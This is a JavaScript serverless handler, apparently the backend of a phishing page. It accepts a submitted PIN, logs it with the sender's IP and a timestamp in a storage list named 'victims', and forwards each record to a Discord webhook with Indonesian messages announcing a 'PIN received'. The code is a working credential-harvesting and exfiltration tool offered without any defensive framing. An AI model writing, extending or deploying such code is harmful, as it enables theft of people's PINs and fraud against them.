import { kv } from '@vercel/kv';

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    const pin = req.query.pin || req.body?.pin || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();
    
    const record = { type: 'pin', pin, ip, timestamp };
    
    try {
        await kv.lpush('victims', JSON.stringify(record));
    } catch (e) {}
    
    // Kirim ke Discord
    if (WEBHOOK_URL) {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔑 **PIN DITERIMA**\n**PIN:** ${pin}\n**IP:** ${ip}\n**Time:** ${timestamp}`
            })
        });
    }
    
    return res.status(200).json({ status: 'ok' });
}
